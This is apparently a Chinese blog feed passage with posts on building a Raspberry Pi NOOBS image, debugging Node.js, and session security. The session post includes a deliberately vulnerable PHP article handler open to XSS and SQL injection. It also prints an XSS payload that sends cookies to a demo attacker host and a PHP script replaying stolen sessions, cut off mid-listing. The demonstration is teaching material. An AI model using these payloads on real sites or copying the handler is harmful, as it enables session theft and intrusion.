<p>可以看到在json文件中属性partitions是一个数组类型，数组每个元素定义的是一个分区信息。首先看label为boot的分区，这是一个FAT格式的分区，被用作操作系统启动分区；然后label为root的是ext4分区，里面存放linux操作系统分区。partition_size_nominal是说分区的大小，want_maximised是说当前分区是否需要被扩展，如果为false，则分区的大小就是partition_size_nominal的指定值，如果为true，则noobs会根据sd卡的大小尽量的分配尽可能多的空间给当前分区。<br>9. 之前说过，我们从retropie官网上下载下来它的安装文件，将其解压后我们得到一个img文件。按照noobs给出的文档，根据partitions.json中的配置的信息，我们应该生成两个压缩文件，分别为boot.tar.xz和root.tar.gz，文件名实际上对应的是配置文件中的label属性。那么我们现在得到的是img文件，怎样得到这两个文件呢？<br>如果你是用linux，这个问题很好解决，linux下可以使用mount命令直接把img文件挂载到指定目录上；如果使用windows，那就只能用虚拟机了。好吧，我就是用的windows，打开自己的虚拟机，通过vbox上的共享目录，来访问windows上的这个img文件。<br><img src="http://blog.whyun.com/images/select_share.png" alt="vbox共享"><br><strong>图2.1 共享文件夹设置1</strong><br>在弹出的界面中新增一个共享设置，我们假设img文件放在e:\sharing下，那么可以做如下设置：<br><img src="http://blog.whyun.com/images/add_new_vbox_share.png" alt="新建共享"><br><strong>图2.2 新建共享</strong><br>最后在ubuntu下通过命令<code>mount -t vboxsf sharing /mnt/share</code>来加载这个共享（这里假设/mnt/share目录已经存在了）。在/mnt/share下我们用fdisk命令来查看img文件内部的分区情况：</p>
<pre><code><div class="highlight"><pre><span class="nx">fdisk</span> <span class="o">-</span><span class="nx">lu</span> <span class="nx">RetroPieImage_ver2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="nx">img</span>
</pre></div>
</code></pre>
<p>该命令将会输出如下内容：</p>
<pre><code><div class="highlight"><pre><span class="nx">Disk</span> <span class="nx">RetroPieImage_ver2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="nx">img</span><span class="o">:</span> <span class="mi">3460</span> <span class="nx">MB</span><span class="p">,</span> <span class="mi">3460300800</span> <span class="nx">bytes</span>
<span class="mi">255</span> <span class="nx">heads</span><span class="p">,</span> <span class="mi">63</span> <span class="nx">sectors</span><span class="o">/</span><span class="nx">track</span><span class="p">,</span> <span class="mi">420</span> <span class="nx">cylinders</span><span class="p">,</span> <span class="nx">total</span> <span class="mi">6758400</span> <span class="nx">sectors</span>
<span class="nx">Units</span> <span class="o">=</span> <span class="err">扇区</span> <span class="nx">of</span> <span class="mi">1</span> <span class="o">*</span> <span class="mi">512</span> <span class="o">=</span> <span class="mi">512</span> <span class="nx">bytes</span>
<span class="nx">Sector</span> <span class="nx">size</span> <span class="p">(</span><span class="nx">logical</span><span class="o">/</span><span class="nx">physical</span><span class="p">)</span><span class="o">:</span> <span class="mi">512</span> <span class="nx">bytes</span> <span class="o">/</span> <span class="mi">512</span> <span class="nx">bytes</span>
<span class="nx">I</span><span class="o">/</span><span class="nx">O</span> <span class="nx">size</span> <span class="p">(</span><span class="nx">minimum</span><span class="o">/</span><span class="nx">optimal</span><span class="p">)</span><span class="o">:</span> <span class="mi">512</span> <span class="nx">bytes</span> <span class="o">/</span> <span class="mi">512</span> <span class="nx">bytes</span>
<span class="nx">Disk</span> <span class="nx">identifier</span><span class="o">:</span> <span class="mh">0x000981cb</span>

                   <span class="err">设备</span> <span class="err">启动</span> <span class="err">起点</span> <span class="err">终点</span> <span class="err">块数</span> <span class="nx">Id</span> <span class="err">系统</span>
<span class="nx">RetroPieImage_ver2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="nx">img1</span> <span class="mi">8192</span> <span class="mi">122879</span> <span class="mi">57344</span> <span class="nx">c</span> <span class="nx">W95</span> <span class="nx">FAT32</span> <span class="p">(</span><span class="nx">LBA</span><span class="p">)</span>
<span class="nx">RetroPieImage_ver2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="nx">img2</span> <span class="mi">122880</span> <span class="mi">6676479</span> <span class="mi">3276800</span> <span class="mi">83</span> <span class="nx">Linux</span>
</pre></div>
</code></pre>
<p>通过输出可以轻易的发现，img文件中有两个分区，第一个分区从8192扇区开始，第二个分区从122880扇区开始，然后输出信息还指示一个扇区是512字节。接下来我们创建两个目录来加载这两个目录：</p>
<pre><code><div class="highlight"><pre><span class="nx">sudo</span> <span class="nx">mkdir</span> <span class="o">/</span><span class="nx">mnt</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">img1</span>
<span class="nx">sudo</span> <span class="nx">mkdir</span> <span class="o">/</span><span class="nx">mnt</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">img2</span>
</pre></div>
</code></pre>
<p>接下来是mount命令的使用，mount命令的<code>-o</code>参数可以指定从某一个字节处开始mount，那么加载第一个分区的命令就是如下所示了：</p>
<pre><code><div class="highlight"><pre><span class="nx">sudo</span> <span class="nx">mount</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">loop</span><span class="p">,</span><span class="nx">offset</span><span class="o">=</span><span class="nx">$</span><span class="p">((</span><span class="mi">8192</span><span class="o">*</span><span class="mi">512</span><span class="p">))</span> <span class="nx">RetroPieImage_ver2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="nx">img</span> <span class="o">/</span><span class="nx">mnt</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">img1</span>
</pre></div>
</code></pre>
<p>现在我们进入img1目录，进行打包：</p>
<pre><code><div class="highlight"><pre><span class="nx">tar</span> <span class="o">-</span><span class="nx">cvpf</span> <span class="p">..</span><span class="o">/</span><span class="nx">boot</span><span class="p">.</span><span class="nx">tar</span> <span class="p">.</span>
</pre></div>
</code></pre>
<p>其中打包的时候我们制定了<code>p</code>参数，这里是告诉tar命令，在tar命令运行时，要保留原文件的权限属性不变。<br>接着就是使用xz命令就行压缩了：</p>
<pre><code><div class="highlight"><pre><span class="nx">xz</span> <span class="o">-</span><span class="mi">9</span> <span class="o">-</span><span class="nx">e</span> <span class="nx">boot</span><span class="p">.</span><span class="nx">tar</span>
</pre></div>
</code></pre>
<p>最终生成一个<code>boot.tar.xz</code>文件，拷贝到文件夹RetroPie中。同理我们可以再生成一个<code>root.tar.xz</code>文件。<strong>但是要注意，在生成<code>boot.tar</code>的时候要使用管理员权限，即运行<code>sudo tar -cvpf ../root.tar</code>，否某些文件会提示没有权限操作。</strong><br>10. noobs在进行分区的时候需要读取脚本<code>partition_setup.sh</code>来完成分区操作，如果当前系统是由<code>Raspbian</code>改装来的（比如<code>RetroPie</code>和<code>raspbmc</code>、<code>Pidora</code>），那么直接使用<code>Raspbian</code>文件夹中的<code>partition_setup.sh</code>即可，但是有一些系统不是标准linux，比如说<code>openelec</code>，这时候你可以从github项目<a href="https://github.com/procount/noobsconfig">procount/noobsconfig</a>找到相应的sh脚本文件。<br>11. 最后我们就是格式化SD卡了，使用SDFormatter（<a href="https://www.sdcard.org/chs/downloads/formatter_4/">下载页面地址</a>）将你的SD卡格式化，然后将制作好的noobs文件全部拷贝到sd卡中，保证recovery.img在sd卡根目录：</p>
<p><img src="http://blog.whyun.com/images/noobs_files.jpg" alt="noobs根目录"><br><strong>图2.3 sd卡根目录</strong><br>至此一个自定义的操作系统已经成功制作完成，将sd卡插入树莓派就可以安装了。</p>
]]></description><link>http://blog.whyun.com/posts/noobs/</link><guid isPermaLink="true">http://blog.whyun.com/posts/noobs/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Fri, 21 Nov 2014 00:00:00 GMT</pubDate></item><item><title><![CDATA[node中调试子进程]]></title><description><![CDATA[<p>现在node.js在单步调试中做的最好的，就要数intellij idea了，但是node在使用cluster的时候，无法开启调试，stackoverflow上有对这个问题的描述与解答（点击<a href="http://stackoverflow.com/questions/16840623/how-to-debug-node-js-child-forked-process">这里</a>查看）。但是这里要将的解决方案确实通过增加启动参数控制，摒弃多进程模式来实现调试，比如说在本地测试的时候启动单进程，在运营环境中使用多进程。</p>
<p>node.js中可以读取环境变量，使用方法为<code>process.env.环境变量名</code>，也就是说可以通过下列方式来控制是否启用多进程：</p>
<pre><code><div class="highlight"><pre><span class="k">if</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">DEBUG_LOCAL</span> <span class="o">==</span> <span class="s1">&#39;true&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">//单进程代码处理</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">//cluster代码处理</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p><strong>代码1.1</strong></p>
<p>剩下的就是在idea中配置环境变量了，点击调试的配置功能，即点击图1.1位置。<br><img src="/images/edit_config.jpg" alt="选择配置"><br><strong>图1.1 选择配置</strong></p>
<p>在打开的界面中点击环境变量配置功能按钮<br><img src="/images/set_env_show.jpg" alt="配置界面"><br><strong>图1.2 配置界面</strong></p>
<p>添加一个环境变量<br><img src="/images/add_env.jpg" alt="添加环境变量"><br><strong>图1.3 添加环境变量</strong>  </p>
<p>至此完成配置，点击调试后，就会将当前的代码运行成单进程，在生产环境中不加环境变量启动，则运行到正常的cluster代码中。</p>
]]></description><link>http://blog.whyun.com/posts/node/</link><guid isPermaLink="true">http://blog.whyun.com/posts/node/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Thu, 31 Jul 2014 00:00:00 GMT</pubDate></item><item><title><![CDATA[session的安全性]]></title><description><![CDATA[<h2><a name="session" class="anchor" href="#session"><span class="header-link"></span></a>session原理</h2>
<p>提到session，大家肯定会联想到登录，登录成功后记录登录状态，同时标记当前登录用户是谁。功能大体上就是这个样子，但是今天要讲的不是功能，而是实现。通过探讨session的实现方式来发掘一些可能你之前不知道的有趣的事情。<br>为了记录session，在客户端和服务器端都要保存数据，客户端记录一个标记，服务器端不但存储了这个标记同时还存储了这个标记映射的数据。好吧，还是说点白话吧，在客户端记录的其实是一个sessionid，在服务器端记录的是一个key-value形式的数据结构，这里的key肯定是指sessionid了，value就代表session的详细内容。用户在做http请求的时候，总是会把sessionid传递给服务器，然后服务器根据这个sessionid来查询session的内容（也就是上面说到的value）。<br>现在我们重点关注一下sessionid，他是今天问题的关键所在。sessionid在客户端（http的客户端一般就是指浏览器了）是存储在cookie中，当然也有例外（书本上肯定会提到也有保存在url中的，我做程序员这么多年也没有见过这种方式，这难道就是现实和实际的差距吗，好残酷）。
我们通过一个例子来阐述一下这个sessionid在session处理时的作用。首先假定这么一个场景，我们有一个cms（content management system，内容管理系统），这个应用有一个后台，用户必须登录才能进入后台进行文章发表等操作。首先是登录流程，用户在浏览器输入用户名、密码，点击登录，浏览器会将用户名密码提交到服务器程序进行处理；服务器验证用户名、密码正确后，会返回登录成功信息，并且会修改服务器端的session内容，比如我们将用户ID写入session中，为了方便存储这些session的内容会被序列化成字符串或者二进制保存在文件或者数据库中，这时候大多数情况下服务器在对当前的http请求进行响应时，会返回一个新的sessionid要求浏览器写入本地cookie中，对应的返回的http响应头部信息应该会是是这个样子的：<code>set-cookie:PHPSESSID=xxxxxxx</code>,浏览器解析到这个头之后就会在当前生成一个cookie关联当前的域名。
<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/login.png" alt="登录时序图">
<strong>图1.1 登录时序图</strong>
接着用户登录后台进行发表文章操作，登录用户填写文章的标题、内容，然后点击发送。这时候浏览器会生成一条到服务器的http请求，注意这个请求的头部会将存储sessionid的cookie内容发送过去，也就是说请求的http头部信息中应该会有这么一段数据：<code>cookie:PHPSESSID=xxxxxxx;other_cookie_name=yyyyyy</code>；服务器接收到这个http请求之后，解析到cookie存在，且cookie中存在PHPSESSID这个cookie名字，然后就将PHPSESSID的值（也就是sessionid的值）取出来，根据这个PHPSESSID查询服务器上有没有对应的session内容，如果有则将其对应的值取出来进行反序列序列化（也就是将其转成编程语言中的一个数据结果，比如在php中会得到一个<code>$_SESSION</code>数组，在j2ee中会得到类型为<code>javax.servlet.http.HttpSession</code>），方便在程序中进行读取，最终服务器认定session中储存的值存在，并且从反序列化得到的对象中读取到了用户ID属性，然后就往cms数据库的文章表中插入了一条数据，最终返回http响应，告诉浏览器操作成功了。
<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/publish.png" alt="发表文章时序图">
<strong>图1.2 发表文章时序图</strong></p>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>入侵示例</h2>
<p>关于cookie的一些属性，可以参考我的另一篇博文<a href="http://blog.csdn.net/yunnysunny/article/details/7748106" title="关于cookie的一些事">关于cookie的一些事</a>，里面会提到一个httponly的属性，也就是是否禁止js读取cookie。不幸的是很多常见的服务器（比如apache和tomcat）在生成这个存储sessionid的cookie的时候，没有设置httponly这个属性，也就是说js是可以将这个sessionid读取出来的。<br>js读取到sessionid，这会有问题吗？如果没有问题，我就不在这里啰嗦了。你网站上的运行的js代码并不一定是你写的，比如说一般网站都有一个发表文章或者说发帖的功能，如果别有用心的人在发表的时候填写了html代码（这些html一般是超链接或者图片），但是你的后台又没有将其过滤掉，发表出来的文章，被其他人点击了其中恶意链接时，就出事了。这也就是我们常说的XSS。 </p>
<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
    <span class="nb">session_start</span><span class="p">();</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;尚未登录&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span>
        <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../globaldb.php&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span> <span class="p">{</span>
            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;标题为空&#39;</span><span class="p">;</span>
            <span class="nx">goto</span> <span class="nb">end</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="p">{</span>
            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;内容为空&#39;</span><span class="p">;</span>
            <span class="nx">goto</span> <span class="nb">end</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">getStatus</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$title</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">];</span>
            <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
            <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;insert into article(title,content,uid,create_time) values(&quot;&#39;</span><span class="o">.</span><span class="nv">$title</span><span class="o">.</span><span class="s1">&#39;&quot;,&quot;&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;&quot;,&#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s1">&#39;,now())&#39;</span><span class="p">;</span>
            <span class="nv">$rv</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dbExecute</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$rv</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;插入失败&#39;</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;数据库操作失败&#39;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nb">end</span><span class="o">:</span>
    <span class="k">echo</span> <span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
</pre></div>
</code></pre>
<p><strong>代码2.1 添加文章的后台代码</strong>
这里给出了一段不靠谱代码，之所以这么说是由于对于提交的内容没有做过滤，比如说<code>content</code>表单域的内容。现在假设有这么两个网站，一个你自己的CMS网站，域名<code>mycms.whyun.com</code>,一个黑客用的网站，域名<code>session.myhack.com</code>。你可以通过配置hosts来模拟这两个网站，说到这里可还是推荐一下我之前做过的<a href="http://git.oschina.net/yunnysunny/addhost" title="addhost">addhost</a>工具，可以自动生成hosts和vhost配置。代码2.1正是mycms网站的代码。<br>登录mycms后在后台添加一篇文章，文章内容为：</p>
<pre><code><div class="highlight"><pre><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="err">\</span><span class="s2">&quot;#\&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="err">\</span><span class="s1">&#39;javascript:alert(document.cookie);return false;\&#39;</span><span class="o">&gt;</span><span class="err">点击我，有惊喜！</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
</pre></div>
</code></pre>
<p><strong>代码2.2 alert cookie</strong>
<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/show_cookie.jpg" alt="显示cookie的html">
<strong>图2.1 显示cookie的html</strong></p>
<p>打开刚才生成的文章链接，然后点击<code>点击我，有惊喜！</code>,会显示当前域下的所有cookie。
<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/alert_cookie.jpg" alt="coookie被alert出来">
<strong>图2.2 cookie被alert出来</strong></p>
<p>当然要想做到攻击的目的仅仅做这些是不够的，下面将这个链接的内容做的丰富多彩些。</p>
<pre><code><div class="highlight"><pre><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="err">\</span><span class="s2">&quot;#\&quot; onclick=\&#39;javascript:var link = this; var head = document.getElementsByTagName(\&quot;head\&quot;)[0]; var js = document.createElement(\&quot;script\&quot;); js.src = \&quot;http://session.myhack.com/httphack.php?cook=\&quot;+encodeURIComponent(document.cookie); js.onload = js.onreadystatechange = function(){ if (!this.readyState || this.readyState == \&quot;loaded\&quot; || this.readyState == \&quot;complete\&quot;) {head.removeChild(js);  alert(\&quot;over\&quot;</span><span class="p">);</span> <span class="p">}</span> <span class="p">};</span> <span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span><span class="k">return</span> <span class="kc">false</span><span class="p">;</span><span class="err">\&#39;</span><span class="o">&gt;</span><span class="err">点击我，有惊喜</span><span class="mi">2</span><span class="err">！</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
</pre></div>
</code></pre>
<p><strong>代码2.3 跨站请求</strong><br>这里为了将代码嵌入html，得将其写作一行，其简洁模式为：</p>
<pre><code class="lang-javascript"><div class="highlight"><pre>    <span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">head</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&quot;head&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span> 
    <span class="kd">var</span> <span class="nx">js</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;script&quot;</span><span class="p">);</span> 
    <span class="nx">js</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&quot;http://session.myhack.com/httphack.php?cook=&quot;</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span> 
    <span class="nx">js</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">js</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span> 
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="s2">&quot;loaded&quot;</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="s2">&quot;complete&quot;</span><span class="p">)</span> <span class="p">{</span> 
            <span class="nx">head</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span> 
            <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;开始跳转真正的地址&#39;</span><span class="p">);</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="nx">link</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">&quot;href&quot;</span><span class="p">);</span><span class="c1">//</span>
        <span class="p">}</span>
    <span class="p">};</span> 
    <span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span>
</pre></div>
</code></pre>
<p><strong>代码2.4 跨站请求简洁版</strong>
为了真正的体现他是超链接还是跳转到一个地址为妙，所以在简洁班中脚本加载结束后做了跳转，但是为了演示方便，我们在代码2.3中没有这么做。<br>现在再点击链接<code>点击我，有惊喜！</code>，查看一下一下网络请求，会发现一个到session.myhack.com/httphack.php地址的请求，返回数据为<code>var data = {&quot;code&quot;:0};</code>。
<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/cross_request.jpg" alt="跨站请求">
<strong>图2.3 跨站请求</strong></p>
<p>接着看看httphack.php干了啥：</p>
<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
    <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Content-type:application/javascript&quot;</span><span class="p">);</span>

     <span class="k">function</span> <span class="nf">getRealIp</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
        <span class="nv">$ipname</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">,</span>
            <span class="s1">&#39;HTTP_CLIENT_IP&#39;</span><span class="p">,</span>
            <span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">,</span>
            <span class="s1">&#39;HTTP_X_FORWARDED&#39;</span><span class="p">,</span>
            <span class="s1">&#39;HTTP_X_CLUSTER_CLIENT_IP&#39;</span><span class="p">,</span>
            <span class="s1">&#39;HTTP_FORWARDED_FOR&#39;</span><span class="p">,</span>
            <span class="s1">&#39;HTTP_FORWARDED&#39;</span>
        <span class="p">);</span>
       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$ipname</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span>
       <span class="p">{</span>
           <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">])</span> <span class="p">{</span>

                <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">];</span>
                <span class="k">break</span><span class="p">;</span>
           <span class="p">}</span>
       <span class="p">}</span>
       <span class="k">return</span> <span class="nv">$ip</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$ip</span> <span class="o">=</span> <span class="nx">getRealIp</span><span class="p">();</span>
    <span class="nv">$cookies</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cook&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cook&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$headers</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">&#39;User-Agent:&#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span>
        <span class="s1">&#39;X-FORWARDED-FOR:&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">,</span>
        <span class="s1">&#39;Remote-Addr:&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">,</span>
        <span class="s1">&#39;Cookie:&#39;</span><span class="o">.</span><span class="nv">$cookies</span>
    <span class="p">);</span>
    <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="s2">&quot;http://mycms.whyun.com/back/article/article_add.php&quot;</span><span class="p">);</span>
    <span class="c1">// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>  <span class="c1">//构造IP</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_REFERER</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">]);</span>   <span class="c1">//构造来路</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
    <span class="nv">$params</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;这是跨站攻击测试&#39;</span><span class="p">,</span><span class="s1">&#39;content&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;网站被跨站攻击了&#39;</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$params</span><span class="p">));</span>

    <span class="nv">$out</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>

    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$headers</span><span class="p">);</span>
